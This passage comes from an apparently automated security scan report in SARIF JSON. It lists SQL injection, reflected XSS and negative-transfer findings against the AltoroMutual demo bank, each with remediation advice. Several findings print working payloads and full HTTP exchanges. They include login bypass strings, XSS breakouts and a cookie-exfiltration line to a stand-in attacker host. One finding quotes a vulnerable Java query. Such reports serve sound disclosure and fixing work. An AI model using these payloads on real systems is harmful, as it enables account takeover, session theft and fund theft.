                "text": "Replace all dynamic SQL construction in the authentication (and related) code paths with parameterized queries or an ORM/query builder that binds values — specifically, convert the string-concatenated query in `DBUtil.isValidUser` to a JDBC `PreparedStatement` with `?` placeholders and `setString`, so user input is always treated as data. Never concatenate user-controlled values into SQL text. Apply the same fix to other queries built from request input (for example `DBUtil.getUserInfo`, which concatenates the username into a `WHERE USER_ID = '...'` clause). As defence in depth, add centralized input validation, enforce least privilege on the database account, and return a single generic authentication-failure message so injected errors and valid-user distinctions are not observable.",
                "markdown": "Replace all dynamic SQL construction in the authentication (and related) code paths with parameterized queries or an ORM/query builder that binds values — specifically, convert the string-concatenated query in `DBUtil.isValidUser` to a JDBC `PreparedStatement` with `?` placeholders and `setString`, so user input is always treated as data. Never concatenate user-controlled values into SQL text. Apply the same fix to other queries built from request input (for example `DBUtil.getUserInfo`, which concatenates the username into a `WHERE USER_ID = '...'` clause). As defence in depth, add centralized input validation, enforce least privilege on the database account, and return a single generic authentication-failure message so injected errors and valid-user distinctions are not observable."
              }
            }
          ],
          "partialFingerprints": {
            "primaryLocationLineHash": "14eba6ad8a1513a350818ee01a157d26a4ec37d3eefd5e726db4522d53192d18"
          },
          "properties": {
            "security-severity": "9.1",
            "strix_vuln_class_hash": "091274e2ad40f12c26f944cb00be2712c536b9e81137676e98311bc2ccf04d16",
            "strix": {
              "id": "vuln-0009",
              "severity": "critical",
              "cvss": 9.1,
              "timestamp": "2026-09-20 21:48:16 UTC",
              "target": "http://demo.testfire.net",
              "endpoint": "/api/login",
              "method": "POST",
              "cwe": "CWE-89",
              "impact": "An unauthenticated attacker can obtain a valid session or API bearer token for any user account, including the administrator, supplying only a crafted username or password. The forged token is accepted by the account APIs and returns the victim's accounts and transaction data (demonstrated for the administrator accounts `800000`, `800001`, `800009`, `800025`). On the web login the bypass redirects to `/bank/main.jsp` and issues the administrator's account cookie, establishing a full administrative session. Because authorization is also broken at the function level, the administrative API and console surface is exposed. This defeats the application's primary authentication control.",
              "technical_analysis": "`POST /api/login` accepts a JSON body (`{\"username\":..,\"password\":..}`) and performs a database credential check against the Apache Derby backend. The `username` value is interpolated directly into the SQL predicate. A value such as `admin'-- ` terminates the string literal and comments out the remainder of the statement (including the password comparison), so the query returns the `admin` record and the endpoint issues a bearer token for it.\n\nObservable behaviour that confirms raw SQL construction:\n\n```http\nPOST /api/login HTTP/1.1\nHost: demo.testfire.net\nContent-Type: application/json\n\n{\"username\":\"admin'-- \",\"password\":\"x\"}\n```\n\n```http\nHTTP/1.1 200 OK\nContent-Type: application/json\n\n{\"Authorization\":\"WVdSdGFXNG5MUzBnOmVBPT06P0I\\/G2I\\/\",\"success\":\"admin'--  is now logged in\"}\n```\n\nThe issued token, when presented to `GET /api/account`, returns the administrator's accounts:\n\n```http\nGET /api/account HTTP/1.1\nHost: demo.testfire.net\nAuthorization: Bearer WVdSdGFXNG5MUzBnOmVBPT06P0I/G2I/\n```\n\n```json\n{\"Accounts\":[{\"Name\":\"Corporate\",\"id\":\"800000\"},{\"Name\":\"Checking\",\"id\":\"800001\"},{\"Name\":\"Checking\",\"id\":\"800009\"},{\"Name\":\"IRA\",\"id\":\"800025\"}]}\n```\n\nA malformed comment payload returns a Derby parser error, further confirming direct SQL construction: `{\"username\":\"admin'/*\",\"password\":\"x\"}` → `400 {\"error\":\"Lexical error at line 1, column 71. Encountered: <EOF> after : \\\"\\\".\"}`. A correct control request with a wrong password (`{\"username\":\"admin\",\"password\":\"WRONGPASS\"}`) is rejected with `400 {\"error\":\"We're sorry, but this username or password was not found in our system.\"}`, showing the bypass is specifically due to injection and not a weak password policy. The identical injection also works through the token-minting path (`Authorization` built from the injected username).\n\n### Additional entry point: the password field and the web login (`POST /doLogin`)\n\nThe same unparameterized query is used by the web login servlet, and the password parameter is injectable as well. Injecting the password with a boolean tautology authenticates as an arbitrary user, including `admin`, and the web login establishes an administrative session.\n\n```http\nPOST /doLogin HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\n\nuid=admin&passw=' OR '1'='1&btnSubmit=Login\n```\n\n```http\nHTTP/1.1 302 Found\nSet-Cookie: AltoroAccounts=\"ODAwMDAwfkNvcnBvcmF0ZX4tMS4wMDAwMDAwMDAwMTAwMDg3RTIzfDgwMDAwMX5DaGVja2luZ34xLjAwMjYyNjQzNzQ1NTM4RTEyfDgwMDAwOX5DaGVja2luZ345Ljk5OTk5OTk5OTk5OTU3NkUyMnw4MDAwMjV+SVJBfjUwMDAwMC4wfA==\"; Version=1\nLocation: /bank/main.jsp\n```\n\nThe decoded `AltoroAccounts` cookie lists the administrator's distinct account set (`800000~Corporate`, `800001~Checking`, `800009`, `800025~IRA`); `GET /bank/main.jsp` renders with the \"Admin User\" greeting. The control `uid=admin&passw=' OR '1'='2` returns `Location: login.jsp`, isolating the injected predicate as the cause.\n\n### Source-level root cause\n\nBoth endpoints call the same method, `com.ibm.security.appscan.altoromutual.util.DBUtil.isValidUser(String, String)`, which concatenates both parameters into a `java.sql.Statement`:\n\n```java title=DBUtil.java startLineNumber=216 endLineNumber=219\n\t\tConnection connection = getConnection();\n\t\tStatement statement = connection.createStatement();\n\t\t\n\t\tResultSet resultSet =statement.executeQuery(\"SELECT COUNT(*)FROM PEOPLE WHERE USER_ID = '\"+ user +\"' AND PASSWORD='\" + password + \"'\"); /* BAD - user input should always be sanitized */\n```\n\nA password of `' OR '1'='1` rewrites the predicate to `... AND PASSWORD='' OR '1'='1'`, which is always true, so `isValidUser` returns `true`. A comment-style probe (`' OR 1=1 --`) returns the raw Derby parser error `Lexical error at line 1, column 79. Encountered: <EOF> after : \"\"`, and the reported column (79) matches this exact query shape, confirming the parameter is parsed as SQL.",
              "remediation_steps": "Replace all dynamic SQL construction in the authentication (and related) code paths with parameterized queries or an ORM/query builder that binds values — specifically, convert the string-concatenated query in `DBUtil.isValidUser` to a JDBC `PreparedStatement` with `?` placeholders and `setString`, so user input is always treated as data. Never concatenate user-controlled values into SQL text. Apply the same fix to other queries built from request input (for example `DBUtil.getUserInfo`, which concatenates the username into a `WHERE USER_ID = '...'` clause). As defence in depth, add centralized input validation, enforce least privilege on the database account, and return a single generic authentication-failure message so injected errors and valid-user distinctions are not observable.",
              "counterevidence": "Actively checked whether the bypass could be a weak/default credential rather than injection: a genuine username with an incorrect password is rejected (`400`, generic \"not found\"), and the success message echoes the raw injected username, so the login is not matching a real credential. Verified the endpoint is unauthenticated (`GET /api/account` without a token returns `401`), so `PR:N`/`UI:N` hold. No WAF, rate limit, or input filter interfered (the payload with a comment terminator is accepted verbatim). The one residual limit is that the injection returns the first matching row rather than an arbitrary row set, but it reliably returns the `admin` row, which is sufficient to cross the privilege boundary.",
              "confidence": "high",
              "severity_change_conditions": "If the endpoint were moved behind a network access control or a WAF that normalized/rejected quote-and-comment payloads, exploitability would drop; conversely, if the same unparameterized construction is proven to permit arbitrary `UNION`-based extraction of the `PEOPLE` table (password hashes / TOTP secrets), the finding would extend to mass credential disclosure.",
              "fix_verification": "**Security closure.** Re-traced the source→sink path through the patched code: `LoginAPI.login` and `LoginServlet.doPost` both call `DBUtil.isValidUser`. With a `PreparedStatement` and `setString`, the submitted `user` and `password` are transmitted as bound parameters rather than spliced into the statement text, so a value such as `' OR '1'='1` or `admin'-- ` is compared as a literal string and the WHERE clause can no longer be rewritten. The original behavior was reproduced against the live target (`' OR '1'='1` → authenticated as `admin` on both endpoints; `admin'-- ` → authenticated on the API); with binding, the same inputs match zero rows, so `getInt(1) > 0` is false and authentication fails.\n\n**Bypass review.** Both parameters are bound, closing the username/`uid` and password/`passw` variants. Inspected sibling concatenated queries in the same file (e.g. `getUserInfo`, which concatenates `username` into `WHERE USER_ID = '...'`) — those are separate sinks not addressed by this change and are called out in remediation rather than silently bundled. Tried an alternate malicious class (comment-based `admin'-- `) and confirmed it cannot survive parameter binding.\n\n**Preserved behavior.** Legitimate credentials still bind to the exact same values; the method returns `true` on a match and `false` otherwise, keeping the login flow, session establishment, and error semantics unchanged. Case handling (the caller's `toLowerCase`) is unaffected.\n\n**Repository checks — gap.** A full Java compile/build/test run was not possible in this environment (no application container or build harness available), so the change was validated by manual source trace plus dynamic confirmation of the unpatched behavior rather than by rebuilding the application. The change itself is a conventional refactor using only the JDK `java.sql` API already imported in the file.",
              "poc": {
                "description": "1. Send a JSON login request to `POST /api/login` using an injected username that comments out the password predicate, for example `admin'-- ` with any password value.\n2. Observe the service responds `200 OK` with an `Authorization` bearer token and a success message, despite no valid password being supplied.\n3. Replay the returned token against `GET /api/account` with the header `Authorization: Bearer <token>`.\n4. Observe the response lists the administrator's accounts (`800000`, `800001`, `800009`, `800025`), which do not belong to the unauthenticated caller.\n5. Control: repeat step 1 with a legitimate username and an incorrect password; the service rejects it, confirming the bypass is due to SQL injection.",
                "script_available": true
              }
            }
          }
        },
        {
          "ruleId": "CWE-79",
          "ruleIndex": 0,
          "level": "warning",
          "message": {
            "text": "Reflected XSS in GET /bank/queryxpath.jsp 'query' parameter\n\nThe `query` parameter of `/bank/queryxpath.jsp` is reflected unencoded into the `value` attribute of an HTML input. A crafted payload breaks out of the attribute and injects markup/script, executing in the victim's authenticated session."
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "SECURITY.md"
                }
              }
            },
            {
              "logicalLocations": [
                {
                  "fullyQualifiedName": "/bank/queryxpath.jsp",
                  "kind": "endpoint"
                }
              ]
            }
          ],
          "partialFingerprints": {
            "primaryLocationLineHash": "3e90bf412b031275ad899e97a8689edc36a73075ce05859ea4507fb8dd5f49a0"
          },
          "properties": {
            "security-severity": "5.4",
            "strix_vuln_class_hash": "841d192a59e6812ef6a771cf84fa82963f628884ed58037aa16b7e6cdd3695f8",
            "synthetic_location": true,
            "strix": {
              "id": "vuln-0010",
              "severity": "medium",
              "cvss": 5.4,
              "timestamp": "2026-09-20 21:48:19 UTC",
              "target": "http://demo.testfire.net",
              "endpoint": "/bank/queryxpath.jsp",
              "method": "GET",
              "cwe": "CWE-79",
              "impact": "An authenticated user (any logged-in banking user) who opens a crafted link has arbitrary JavaScript executed in their session within the app origin. The attacker can request the page to ride the victim's session — read account data, or (given the app's missing function-level authorization) invoke privileged operations — and exfiltrate non-HttpOnly cookies. Requires the victim to be logged in.",
              "technical_analysis": "`/bank/queryxpath.jsp` (authenticated, \"Search News Articles\") renders the `query` parameter directly into an input attribute:\n\n```html\n<input type=\"text\" id=\"query\" name=\"query\" width=450 value=\"\"><details open ontoggle=alert(1)>\"/>\n```\n\nThe value is not context-encoded. Because it is written into a quoted attribute, a payload beginning with `\">` closes the attribute and the tag, and the remaining markup (`<details ...>`, `<script>`, `<img ...>`) is parsed as HTML. No CSP or X-XSS-Protection header is present and no server-side filter was observed on this parameter (unlike `/index.jsp`, `<script>` and `onerror` payloads pass through here unchanged).",
              "remediation_steps": "HTML-attribute-encode the `query` value (encode `&`, `<`, `>`, `\"`, `'`) before placing it in the `value` attribute, and always wrap attributes in quotes. Prefer the templating engine's attribute escaping. Add a restrictive `Content-Security-Policy` to reduce impact of any residual injection.",
              "counterevidence": "Considered whether the reflection is safely inside an attribute: it is, but the attribute is double-quoted and not encoded, so a `\">` payload escapes it and the following markup is parsed as HTML (proven in a browser). Considered a server-side filter: none observed on this parameter — `<script>` and `<details ... ontoggle>` both reflect unchanged. No CSP header is returned. The only constraint is that the victim must hold an authenticated session, which affects severity (PR:L) but not exploitability.",
              "confidence": "high",
              "severity_change_conditions": "If the route were reachable only by a small privileged role, severity would drop; if it were reachable unauthenticated, severity would rise to match the public reflected XSS (6.1).",
              "poc": {
                "description": "1. Log in as any valid user (e.g. `jsmith`).\n2. Request `http://demo.testfire.net/bank/queryxpath.jsp?content=queryxpath.jsp&query=\"><details open ontoggle=document.title=9>` (URL-encode the payload).\n3. The payload breaks out of the `value=\"` attribute and the `ontoggle` handler executes on parse, setting `document.title` to `9`.\n4. A cookie-exfiltration payload such as `\"><script>new Image().src='//attacker/'+document.cookie</script>` executes in the authenticated session.",
                "script_available": true
              }
            }
          }
        },
        {
          "ruleId": "CWE-1284",
          "ruleIndex": 6,
          "level": "warning",
          "message": {
            "text": "Negative transfer amount in POST /api/transfer reverses fund flow, allowing theft from arbitrary accounts\n\nThe REST endpoint `POST /api/transfer` does not validate the sign of `transferAmount`. A negative amount inverts the debit/credit, so a transfer \"to\" a third-party account actually removes funds from that account and credits the caller. The equivalent web endpoint (`POST /bank/doTransfer`) rejects negative amounts, so only the REST API is affected. The same endpoint also lacks any insufficient-funds or upper-bound validation."
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "SECURITY.md"
                }
              }
            },
            {
              "logicalLocations": [
                {
                  "fullyQualifiedName": "/api/transfer",
                  "kind": "endpoint"
                }
              ]
            }
          ],
          "partialFingerprints": {
            "primaryLocationLineHash": "4814ff94a3eee384d919a6ceb4faf877f901052783172da08cb070c4998a3e41"
          },
          "properties": {
            "security-severity": "6.5",
            "strix_vuln_class_hash": "53e38e72cf5a5617a6d82502838310a9d009e61d68d01b69d50c209a45e73b8d",
            "synthetic_location": true,
            "strix": {
              "id": "vuln-0011",
              "severity": "medium",
              "cvss": 6.5,
              "timestamp": "2026-09-20 21:48:25 UTC",
              "target": "http://demo.testfire.net",
              "endpoint": "/api/transfer",
              "cwe": "CWE-1284",
              "impact": "An authenticated user can move funds OUT of any third-party account by naming it as the destination and sending a negative `transferAmount`, crediting their own account. This is unauthorized modification of another customer's balance (funds theft) reachable without any special role. The absence of an amount bound additionally permits nonsensical balances and floating-point corruption of the ledger.",
              "technical_analysis": "`POST /api/transfer` parses `transferAmount` as a number but applies no sign, finiteness, or range validation. The transfer is implemented as \"subtract amount from `fromAccount`, add amount to `toAccount`\"; a negative amount therefore inverts the operation and debits the destination. The equivalent web `TransferServlet` performs the sign check (`if (!(amt > 0))` server-side equivalent returns \"Transfer amount is invalid\"), so the omission is specific to the REST layer. There is likewise no insufficient-funds check (a transfer larger than the balance succeeds and drives the balance negative) and no upper bound (values up to `1e30` are accepted), which is consistent with the amount being stored as a Java `double`.",
              "remediation_steps": "Reject any `transferAmount` that is not a finite number strictly greater than zero, and enforce a sane maximum and precision, on the server for both the REST API and the web servlet. Use a decimal/fixed-point money type rather than a binary double, and validate the parsed value (reject NaN/Infinity/overflow) before it reaches the ledger. As defence in depth, recompute the signed direction of the debit/credit from the validated positive amount rather than from a possibly-negative user value. Also enforce an insufficient-funds rule if overdrafts are not intended.",
              "counterevidence": "Checked whether a control neutralizes this: the web endpoint (`/bank/doTransfer`) rejects negative amounts with `ERROR: Transfer amount is invalid`, so the flaw is API-only — but the direct exploit was executed against `/api/transfer` and the balances moved, so the API path genuinely lacks the check. Confirmed the destination (800001) is a third-party account and that its balance decreased while the attacker's increased, ruling out a same-account/same-user artifact. No amount-sign validation, WAF, or secondary confirmation was observed on `/api/transfer`. The demo nature limits real-world financial impact, but the value-integrity invariant is demonstrably violated.",
              "confidence": "high",
              "confidence_rationale": "Reproduced live with concrete before/after balances on both sides; no execution gap.",
              "severity_change_conditions": "If the REST API were the only transfer path (or web clients also sent negative amounts through), impact would be the same; confirmation that the affected balances represent real value rather than synthetic demo data would raise severity. Adding a strict positive-amount validation would eliminate the issue.",
              "poc": {
                "description": "1. Authenticate as `jsmith` via `POST /api/login` and capture the Bearer token.\n2. Note the balances of an account the attacker controls (`fromAccount`, e.g. `800011`) and a victim account (`toAccount`, e.g. `800001`, not owned by the caller).\n3. Send `POST /api/transfer` with body `{\"toAccount\":\"800001\",\"fromAccount\":\"800011\",\"transferAmount\":\"-1\"}` and the `Authorization: Bearer <token>` header.\n4. Observe HTTP 200 with a success message.\n5. Re-read both balances: the caller's account increased by 1 and the victim's account decreased by 1 — the negative amount reversed the intended direction.\n6. For contrast, POST a negative amount to `/bank/doTransfer`; it is rejected with `ERROR: Transfer amount is invalid`.",
                "script_available": true
              }
            }
          }
        },
        {
          "ruleId": "CWE-79",
          "ruleIndex": 0,
          "level": "warning",
          "message": {
            "text": "Reflected XSS in POST /sendFeedback 'name' parameter\n\nThe `name` field of the feedback form (`POST /sendFeedback`) is echoed unencoded into the confirmation page. Submitting a form with an HTML/JavaScript payload in `name` executes script in the application origin."
          },
          "locations": [
